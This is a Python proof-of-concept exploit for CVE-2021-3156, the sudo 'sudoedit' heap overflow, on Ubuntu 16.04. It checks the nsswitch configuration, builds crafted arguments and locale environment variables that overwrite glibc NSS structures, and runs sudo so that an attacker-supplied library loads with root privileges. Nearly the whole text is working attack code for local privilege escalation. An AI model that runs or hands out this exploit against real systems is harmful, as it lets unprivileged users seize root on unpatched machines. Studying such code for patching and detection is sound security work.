'''
Exploit for CVE-2021-3156 on Ubuntu 16.04 by sleepya
From https://github.com/worawit/CVE-2021-3156
This exploit requires:
- glibc without tcache
- nscd service is not running
- only defaults /etc/nsswitch.conf (need adjust LC_* if changed)
Below is important struct that MUST be carefully overwritten
- NULL name_database_entry->next and name_database_entry->service
- overwrite service_user object
Note: Exploit might fail with certain configuration even on a tested target. Don't expect too much.
Tested on:
- Ubuntu 16.04.1
- Ubuntu 16.04
'''
import os
import sys
SUDO_PATH = b"/usr/bin/sudo"
def execve(filename, argv, envp):
	from ctypes import cdll, c_char_p, POINTER
	libc = cdll.LoadLibrary("libc.so.6")
	libc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)
	cargv = (c_char_p * len(argv))(*argv)
	cenvp = (c_char_p * len(env))(*envp)
	libc.execve(filename, cargv, cenvp)
def check_nsswitch():
	idx = 0
	found_passwd = False
	with open('/etc/nsswitch.conf', 'r') as f:
		for line in f:
			if line.startswith('#'):
				continue # comment
			line = line.strip()
			if not line:
				continue # empty line
			words = line.split()
			cnt = 0
			for word in words[1:]:
				if word[0] != '[':
					cnt += 1
			if words[0] == 'group:':
				if not found_passwd:
					return False
				return cnt == 1
			if words[0] == 'passwd:':
				if cnt != 1:
					return False
				found_passwd = True
	return False
assert check_nsswitch(), '/etc/nsswith.conf is not default. offset is definitely wrong'
TARGET_CMND_SIZE = 0x30
libnss_name = sys.argv[1]
working_dir = sys.argv[2]
os.chdir(working_dir)
argv = [ b"sudoedit", b"-A", b"-s", b"a", b"a", b"A"*(TARGET_CMND_SIZE-0x10-4)+b"\\", None ]
env = [
	b"A"*0xae+b"\\",
	b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", # name_database_entry->next
	b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", # name_database_entry->service
	b"group\\", b"A\\", # name_database_entry->name
	b"A"*0x27+b"\\",
	b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", # service_user->library
	b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", # service_user->known
	libnss_name.encode('latin-1'),  # service_user->name
	b"LC_MESSAGES=C_zzzzzzzz.UTF-8@"+b"L"*0xd0+b";a=a",
	b"LC_PAPER=C_gggg.UTF-8@"+b"L"*0x30,
	b"LC_NAME=C_gggg.UTF-8@"+b"L"*0x4,
	b"LC_TIME=C_gggg.UTF-8@"+b"L"*0x1,
	b"LANG=C.UTF-8@"+b"Z"*0xd0,
	None,
]
execve(SUDO_PATH, argv, env)